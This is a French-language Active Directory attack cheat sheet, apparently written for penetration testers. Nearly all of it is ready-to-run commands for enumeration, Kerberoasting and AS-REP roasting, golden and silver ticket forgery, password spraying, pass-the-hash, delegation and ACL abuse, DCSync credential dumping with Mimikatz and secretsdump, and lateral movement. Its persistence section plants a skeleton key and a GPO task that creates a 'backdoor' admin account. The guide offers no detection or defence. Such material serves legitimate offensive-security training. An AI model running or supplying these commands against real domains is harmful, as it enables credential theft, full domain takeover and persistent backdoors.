# 🏢 Active Directory Attacks - Guide Complet

Guide exhaustif pour l'énumération et l'exploitation des environnements Active Directory.

---

## 📖 Concepts de Base

### Architecture AD

```
Forest          → Ensemble de domaines avec relation de confiance
Domain          → Unité administrative (ex: corp.local)
Domain Controller (DC) → Serveur hébergeant AD
Organizational Unit (OU) → Container pour organiser les objets
Group Policy (GPO) → Politiques appliquées aux objets
```

### Protocoles clés

```
LDAP    (389/636)   → Requêtes annuaire
Kerberos (88)       → Authentification
SMB     (445)       → Partages fichiers
RPC     (135)       → Remote Procedure Call
WinRM   (5985/5986) → Remote Management
```

---

## 1️⃣ Énumération Initiale

### Sans credentials

```bash
# Énumérer le domaine
nmap -p 389,636,88,445 -sV 10.10.10.0/24

# LDAP anonymous bind
ldapsearch -x -H ldap://DC_IP -b "DC=corp,DC=local"

# RPC null session
rpcclient -U "" -N DC_IP
> enumdomusers
> enumdomgroups
> querydominfo

# SMB null session
smbclient -L //DC_IP -N
crackmapexec smb DC_IP -u '' -p '' --shares
enum4linux -a DC_IP

# Kerbrute - énumérer les utilisateurs
kerbrute userenum -d corp.local --dc DC_IP userlist.txt
```

### Avec credentials

```bash
# LDAP
ldapsearch -x -H ldap://DC_IP -D "user@corp.local" -w 'password' -b "DC=corp,DC=local"

# Énumérer tout avec ldapdomaindump
ldapdomaindump -u 'corp.local\user' -p 'password' DC_IP

# CrackMapExec
crackmapexec smb DC_IP -u user -p password --users
crackmapexec smb DC_IP -u user -p password --groups
crackmapexec smb DC_IP -u user -p password --shares

# RPCClient
rpcclient -U "user%password" DC_IP
> enumdomusers
> querygroupmem 512  # Domain Admins

# Énumération PowerShell (depuis Windows)
Get-ADUser -Filter * -Properties *
Get-ADGroup -Filter * | Select Name
Get-ADComputer -Filter * -Properties *
```

### BloodHound

```bash
# Collecte avec SharpHound (Windows)
.\SharpHound.exe -c All
.\SharpHound.exe -c All --domain corp.local --ldapuser user --ldappass password

# Collecte avec bloodhound-python (Linux)
bloodhound-python -u user -p password -d corp.local -ns DC_IP -c All

# Importer dans BloodHound
# 1. Démarrer neo4j: neo4j console
# 2. Démarrer BloodHound
# 3. Importer les fichiers JSON/ZIP

# Requêtes utiles dans BloodHound
# - Shortest path to Domain Admins
# - Find all Kerberoastable users
# - Find computers with unsupported OS
# - Find principals with DCSync rights
```

---

## 2️⃣ Kerberos Attacks

### AS-REP Roasting

**Principe** : Utilisateurs sans pré-authentification Kerberos → Hash récupérable.

```bash
# Identifier les comptes vulnérables
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}  # PowerShell
ldapsearch -x -H ldap://DC_IP -D "user@corp.local" -w 'pass' -b "DC=corp,DC=local" "(&(userAccountControl:1.2.840.113556.1.4.803:=4194304))"

# Extraire les hashes
# Avec Impacket
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip DC_IP -format hashcat

# Avec Rubeus (Windows)
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Cracker
hashcat -m 18200 asrep.txt wordlist.txt
john --wordlist=wordlist.txt asrep.txt
```

### Kerberoasting

**Principe** : Services avec SPN → Ticket TGS contenant hash du service.

```bash
# Identifier les comptes avec SPN
setspn -Q */*  # Windows
GetUserSPNs.py corp.local/user:password -dc-ip DC_IP  # Impacket

# Extraire les tickets
# Avec Impacket
GetUserSPNs.py corp.local/user:password -dc-ip DC_IP -request -outputfile kerberoast.txt

# Avec Rubeus (Windows)
.\Rubeus.exe kerberoast /outfile:kerberoast.txt

# Avec PowerView
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash

# Cracker
hashcat -m 13100 kerberoast.txt wordlist.txt
john --wordlist=wordlist.txt kerberoast.txt
```

### Silver Ticket

**Principe** : Forger un TGS avec le hash du compte de service.

```bash
# Prérequis: hash NTLM du compte de service

# Avec Impacket
ticketer.py -nthash <SERVICE_HASH> -domain-sid <DOMAIN_SID> -domain corp.local -spn MSSQLSvc/sql.corp.local:1433 administrator

# Avec Mimikatz
kerberos::golden /domain:corp.local /sid:S-1-5-21-... /target:sql.corp.local /service:MSSQLSvc /rc4:<HASH> /user:administrator /ptt

# Utiliser le ticket
export KRB5CCNAME=administrator.ccache
mssqlclient.py -k sql.corp.local
```

### Golden Ticket

**Principe** : Forger un TGT avec le hash du compte krbtgt.

```bash
# Prérequis: hash NTLM du compte krbtgt (nécessite compromission DC)

# Avec Impacket
ticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain corp.local administrator

# Avec Mimikatz
kerberos::golden /domain:corp.local /sid:S-1-5-21-... /krbtgt:<HASH> /user:administrator /ptt

# Utiliser le ticket
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass corp.local/administrator@DC_IP
```

---

## 3️⃣ Credential Attacks

### Password Spraying

```bash
# Avec CrackMapExec
crackmapexec smb DC_IP -u users.txt -p 'Summer2024!' --continue-on-success

# Avec Kerbrute (plus discret)
kerbrute passwordspray -d corp.local --dc DC_IP users.txt 'Summer2024!'

# Avec Spray (Windows)
Spray-Passwords.ps1 -Pass 'Summer2024!' -Admin

# Règles communes de mots de passe
Season+Year: Summer2024, Winter2023
Company+123: Corp123!, Company1!
Welcome+1: Welcome1, Welcome123
```

### Pass-the-Hash (PtH)

```bash
# Avec Impacket
psexec.py -hashes :NTLM_HASH corp.local/administrator@TARGET
wmiexec.py -hashes :NTLM_HASH corp.local/administrator@TARGET
smbexec.py -hashes :NTLM_HASH corp.local/administrator@TARGET

# Avec CrackMapExec
crackmapexec smb TARGET -u administrator -H NTLM_HASH
crackmapexec smb TARGET -u administrator -H NTLM_HASH -x "whoami"

# Avec evil-winrm
evil-winrm -i TARGET -u administrator -H NTLM_HASH

# Avec Mimikatz (Windows)
sekurlsa::pth /user:administrator /domain:corp.local /ntlm:HASH /run:cmd
```

### Pass-the-Ticket (PtT)

```bash
# Exporter les tickets (Mimikatz)
sekurlsa::tickets /export

# Importer un ticket
kerberos::ptt ticket.kirbi

# Avec Rubeus
.\Rubeus.exe ptt /ticket:base64_ticket

# Linux avec Impacket
export KRB5CCNAME=/path/to/ticket.ccache
psexec.py -k -no-pass corp.local/user@TARGET
```

### Overpass-the-Hash

```bash
# Convertir hash NTLM en ticket Kerberos

# Avec Rubeus
.\Rubeus.exe asktgt /user:administrator /rc4:NTLM_HASH /ptt

# Avec Impacket
getTGT.py corp.local/administrator -hashes :NTLM_HASH
export KRB5CCNAME=administrator.ccache
```

---

## 4️⃣ Delegation Attacks

### Unconstrained Delegation

```bash
# Identifier les machines avec unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true}  # PowerShell
ldapsearch ... "(userAccountControl:1.2.840.113556.1.4.803:=524288)"

# Exploitation: capturer les TGT des utilisateurs qui se connectent

# Avec Rubeus - monitor les nouveaux tickets
.\Rubeus.exe monitor /interval:5

# Forcer une connexion (PrinterBug)
SpoolSample.exe DC_IP ATTACK_IP
# ou
printerbug.py corp.local/user:password@DC_IP ATTACK_IP

# Capturer et utiliser le ticket
.\Rubeus.exe ptt /ticket:base64_ticket
```

### Constrained Delegation

```bash
# Identifier
Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo

# Exploitation avec S4U
# Avec Rubeus
.\Rubeus.exe s4u /user:service_account /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.corp.local /ptt

# Avec Impacket
getST.py -spn cifs/target.corp.local -impersonate administrator corp.local/service_account -hashes :HASH
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass target.corp.local
```

### Resource-Based Constrained Delegation (RBCD)

```bash
# Prérequis: contrôle d'un compte avec SPN (ou machine account)
# + Write permission sur un ordinateur cible

# Ajouter la délégation
Set-ADComputer target$ -PrincipalsAllowedToDelegateToAccount attacker$

# Avec Impacket
rbcd.py -delegate-from 'attacker$' -delegate-to 'target$' -dc-ip DC_IP -action 'write' 'corp.local/user:password'

# Obtenir un ticket
getST.py -spn cifs/target.corp.local -impersonate administrator corp.local/attacker$ -hashes :HASH
```

---

## 5️⃣ ACL Attacks

### GenericAll / GenericWrite

```bash
# Sur un utilisateur → reset password
net user targetuser NewPass123! /domain

# Avec PowerView
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPass!' -AsPlainText -Force)

# Sur un groupe → s'ajouter
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker

# Sur un ordinateur → RBCD
```

### WriteDACL

```bash
# Ajouter des permissions
# Avec PowerView
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker -Rights All

# Avec Impacket
dacledit.py -action 'write' -rights 'FullControl' -principal 'attacker' -target 'targetuser' corp.local/user:password
```

### DCSync

```bash
# Vérifier les droits DCSync
Get-DomainObjectAcl -Identity "DC=corp,DC=local" | ? {($_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2") -or ($_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2")}

# Exploitation avec Mimikatz
lsadump::dcsync /domain:corp.local /user:administrator
lsadump::dcsync /domain:corp.local /user:krbtgt

# Avec Impacket
secretsdump.py corp.local/user:password@DC_IP
secretsdump.py -hashes :HASH corp.local/admin@DC_IP

# Dump tout
secretsdump.py corp.local/admin:password@DC_IP -just-dc
```

---

## 6️⃣ Lateral Movement

### PSExec

```bash
# Impacket
psexec.py corp.local/admin:password@TARGET
psexec.py -hashes :HASH corp.local/admin@TARGET

# Metasploit
use exploit/windows/smb/psexec
```

### WMI

```bash
# Impacket
wmiexec.py corp.local/admin:password@TARGET

# PowerShell
Invoke-WmiMethod -ComputerName TARGET -Credential $cred -Class Win32_Process -Name Create -ArgumentList "powershell -e BASE64"
```

### WinRM

```bash
# Evil-WinRM
evil-winrm -i TARGET -u admin -p password
evil-winrm -i TARGET -u admin -H NTLM_HASH

# PowerShell
Enter-PSSession -ComputerName TARGET -Credential $cred
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock {whoami}
```

### SMB

```bash
# Impacket
smbexec.py corp.local/admin:password@TARGET
atexec.py corp.local/admin:password@TARGET "whoami"

# CrackMapExec
crackmapexec smb TARGET -u admin -p password -x "whoami"
```

### DCOM

```bash
# Impacket
dcomexec.py corp.local/admin:password@TARGET

# PowerShell (MMC20)
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","TARGET"))
$com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```

---

## 7️⃣ Persistence

### Skeleton Key

```bash
# Injecter dans LSASS (mot de passe universel: mimikatz)
mimikatz # privilege::debug
mimikatz # misc::skeleton

# Se connecter avec n'importe quel user
psexec.py corp.local/anyuser:mimikatz@DC_IP
```

### AdminSDHolder

```bash
# Ajouter un utilisateur à AdminSDHolder (propagé aux groupes protégés)
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -PrincipalIdentity attacker -Rights All

# Attendre 60 minutes (ou forcer)
Invoke-SDPropagator -Force
```

### Group Policy

```bash
# Créer une GPO malveillante
# - Scheduled Task
# - Startup script
# - Registry persistence

# SharpGPOAbuse
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Backdoor" --Author administrator --Command "cmd.exe" --Arguments "/c net user backdoor P@ss123 /add" --GPOName "Default Domain Policy"
```

---

## 8️⃣ Outils Essentiels

### Impacket

```bash
# Installation
pip install impacket
# ou
git clone https://github.com/fortra/impacket
cd impacket && pip install .

# Outils principaux
GetNPUsers.py      # AS-REP Roasting
GetUserSPNs.py     # Kerberoasting
secretsdump.py     # Dump credentials
psexec.py          # Remote execution
wmiexec.py         # WMI execution
smbclient.py       # SMB client
getTGT.py          # Get TGT
getST.py           # Get Service Ticket
ticketer.py        # Forge tickets
```

### Mimikatz

```bash
# Commandes principales
privilege::debug
sekurlsa::logonpasswords    # Dump passwords
sekurlsa::tickets /export   # Export tickets
lsadump::dcsync            # DCSync
lsadump::sam               # Dump SAM
kerberos::golden           # Golden ticket
kerberos::ptt              # Pass-the-ticket
```

### CrackMapExec

```bash
# Enumération
crackmapexec smb TARGET -u user -p pass --users
crackmapexec smb TARGET -u user -p pass --shares
crackmapexec smb TARGET -u user -p pass --sessions
crackmapexec smb TARGET -u user -p pass --loggedon-users

# Exécution
crackmapexec smb TARGET -u user -p pass -x "whoami"
crackmapexec smb TARGET -u user -p pass -X "Invoke-Mimikatz"

# Dump
crackmapexec smb TARGET -u admin -p pass --sam
crackmapexec smb TARGET -u admin -p pass --lsa
crackmapexec smb TARGET -u admin -p pass --ntds
```

### Rubeus

```bash
# Kerberoasting
.\Rubeus.exe kerberoast

# AS-REP Roasting  
.\Rubeus.exe asreproast

# Request TGT
.\Rubeus.exe asktgt /user:user /password:pass

# Pass-the-ticket
.\Rubeus.exe ptt /ticket:base64

# Monitor tickets
.\Rubeus.exe monitor /interval:5
```

---

## 9️⃣ Cheatsheet Rapide

```bash
# Énumération
bloodhound-python -u user -p pass -d corp.local -ns DC_IP -c All
crackmapexec smb DC_IP -u user -p pass --users

# AS-REP Roasting
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip DC_IP

# Kerberoasting
GetUserSPNs.py corp.local/user:pass -dc-ip DC_IP -request

# Password Spray
crackmapexec smb DC_IP -u users.txt -p 'Summer2024!'

# Pass-the-Hash
psexec.py -hashes :HASH corp.local/admin@TARGET
crackmapexec smb TARGET -u admin -H HASH -x "whoami"

# DCSync
secretsdump.py corp.local/admin:pass@DC_IP

# Golden Ticket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain corp.local administrator

# Lateral Movement
psexec.py corp.local/admin:pass@TARGET
evil-winrm -i TARGET -u admin -p pass
wmiexec.py corp.local/admin:pass@TARGET
```

---

## 📚 Ressources

- **HackTricks AD** : https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- **PayloadsAllTheThings AD** : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md
- **The Hacker Recipes** : https://www.thehacker.recipes/ad/
- **ired.team** : https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse
- **Impacket** : https://github.com/fortra/impacket
- **BloodHound** : https://github.com/BloodHoundAD/BloodHound

---

**Tags:** `#activedirectory #ad #kerberos #kerberoasting #pth #dcsync #bloodhound #mimikatz #impacket`
